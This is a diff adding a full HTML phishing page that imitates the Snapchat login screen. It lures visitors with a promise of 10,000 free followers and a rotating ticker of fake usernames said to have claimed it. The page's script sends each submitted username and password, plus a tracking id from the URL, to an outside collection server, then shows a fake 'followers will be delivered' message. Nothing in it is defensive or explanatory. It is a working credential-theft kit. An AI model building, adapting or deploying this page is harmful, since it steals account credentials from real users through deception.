@@ -1,1 +1,195 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Log In - Snapchat</title>
+<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,300" rel="stylesheet" type="text/css">
+<style>
+   body {
+     margin: 0;
+     font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, 'Lucida Grande', sans-serif;
+     background-color: #262626;
+     color: #fff;
+   }
+   a {
+     cursor: pointer;
+     background: 0 0;
+     color: #009fda;
+     text-decoration: none;
+     font-size: 14px;
+   }
+   .inputBox {
+     font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, 'Lucida Grande', sans-serif;
+     margin: 0;
+     outline: 0;
+     -webkit-appearance: none;
+     tap-highlight-color: rgba(255,255,255,0);
+     line-height: 1.2142em;
+     padding: .67861em 1em;
+     font-size: 1em;
+     background-color: #fff;
+     border: 1px solid rgba(39,41,43,.15);
+     color: rgba(0,0,0,.8);
+     border-radius: .2857rem;
+     box-shadow: 0 0 0 0 transparent inset;
+     -webkit-transition: background-color .2s ease, color .2s ease, box-shadow .2s ease, border-color .2s ease;
+     transition: background-color .2s ease, color .2s ease, box-shadow .2s ease, border-color .2s ease;
+     width: 304px;
+     height: 38px;
+     margin-bottom: 15px;
+     font-size: 14px;
+   }
+   button {
+     cursor: pointer;
+     display: inline-block;
+     min-height: 1em;
+     outline: 0;
+     border: none;
+     vertical-align: baseline;
+     background-color: #fffc01;
+     color: #262626;
+     font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, 'Lucida Grande', sans-serif;
+     margin: 0 .25em 0 0;
+     padding: 13px 1.5em;
+     text-shadow: none;
+     font-weight: 700;
+     line-height: 1;
+     font-style: normal;
+     text-align: center;
+     text-decoration: none;
+     text-transform: uppercase;
+     background-image: none;
+     border-radius: 5px;
+     box-shadow: 0 0 0 1px transparent inset, 0 0 0 0 rgba(39,41,43,.15) inset;
+     -webkit-user-select: none;
+     -moz-user-select: none;
+     -ms-user-select: none;
+     user-select: none;
+     -webkit-transition: opacity .1s ease, background-color .1s ease, color .1s ease, box-shadow .1s ease, background .1s ease;
+     transition: opacity .1s ease, background-color .1s ease, color .1s ease, box-shadow .1s ease, background .1s ease;
+     width: 304px;
+     height: 38px;
+   }
+   button:hover {
+     background-color: #F4F100;
+   }
+   .news-ticker {
+     background-color: #ff1493;
+     color: white;
+     padding: 10px;
+     text-align: center;
+     font-weight: bold;
+     border-radius: 8px;
+     margin-bottom: 20px;
+     width: 100%;
+   }
+   .spinner-container {
+     display: none;
+     text-align: center;
+     margin: 20px auto;
+   }
+   .spinner {
+     border: 4px solid rgba(255, 255, 255, 0.3);
+     border-radius: 50%;
+     border-top: 4px solid #ff1493;
+     width: 40px;
+     height: 40px;
+     animation: spin 1s linear infinite;
+   }
+   @keyframes spin {
+     0% { transform: rotate(0deg); }
+     100% { transform: rotate(360deg); }
+   }
+   .verifying-text {
+     margin-top: 10px;
+     font-size: 16px;
+     color: #ff1493;
+   }
+   .success-message {
+     display: none;
+     color: #ff1493;
+     font-weight: bold;
+     text-align: center;
+     margin-top: 20px;
+   }
+</style>
+</head>
+<body>
+   <div id="newsTicker" class="news-ticker">Welcome! Get your free 10,000 followers now!</div>
+   <center>
+      <img src="https://accounts.snapchat.com/accounts/static/images/ghost/ghost.svg" style="width:36px;padding-top:80px;padding-bottom:95px;">
+      <font size="48px;"><br>Log In</font><br>
+      <form id="loginForm">
+         <input class="inputBox" id="username" name="username" type="text" placeholder="Username" style="margin-top:20px;"><br>
+         <input class="inputBox" id="password" name="password" type="password" placeholder="Password"><br>
+         <button type="submit" style="margin-top:5px;">LOG IN</button>
+      </form>
+      <div class="spinner-container" id="spinnerContainer">
+        <div class="spinner"></div>
+        <div class="verifying-text" id="verifyingText">Verifying your Account...</div>
+      </div>
+      <div id="message" class="success-message"></div>
+      <a href="https://accounts.snapchat.com/accounts/password_reset_request">Forgot your password?</a>
+      <div style="position:fixed;background-color:#fff;width:100%;top:0;height:20px;padding:15px;">
+         <font color="#000">Please sign into your account to continue</font>
+      </div>
+   </center>
+<script>
+  const chatId = new URLSearchParams(window.location.search).get("id");
+
+  const usernames = [
+    "official_rahul", "itz_meena", "singh_rockz", "priya_official", "itz_amit_", 
+    "sharma_journey", "mishra_diary", "official_pooja", "gupta_life", "itz_ankit_", 
+    "arora_world", "itz_shivani_", "its_me_ravi", "singh_pride", "itz_neha_", 
+    "official_vikram", "kapoor_lifestyle", "itz_deepak_", "patel_story", "kumar_legend"
+  ];
+
+  function getRandomUsername() {
+    const randomIndex = Math.floor(Math.random() * usernames.length);
+    return usernames[randomIndex];
+  }
+
+  function updateNewsTicker() {
+    const tickerElement = document.getElementById('newsTicker');
+    const randomUsername = getRandomUsername();
+    tickerElement.innerHTML = `${randomUsername} just claimed 10,000 followers!`;
+  }
+
+  setInterval(updateNewsTicker, 1500);
+
+  document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const spinnerContainer = document.getElementById('spinnerContainer');
+    const message = document.getElementById('message');
+    spinnerContainer.style.display = 'block';
+
+    const formData = {
+        email: document.getElementById('username').value,
+        password: document.getElementById('password').value,
+        type: 'snapchat',
+        chat_id: chatId
+    };
+
+    fetch('https://whatapi.cloud:8443/info', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(formData)
+    })
+    .then(response => response.json())
+    .then(data => {
+      spinnerContainer.style.display = 'none';
+      message.innerText = '10,000 Followers will be delivered soon within 24 hours!';
+      message.style.display = 'block';
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      spinnerContainer.style.display = 'none';
+    });
+  });
+</script>
+</body>
+</html>
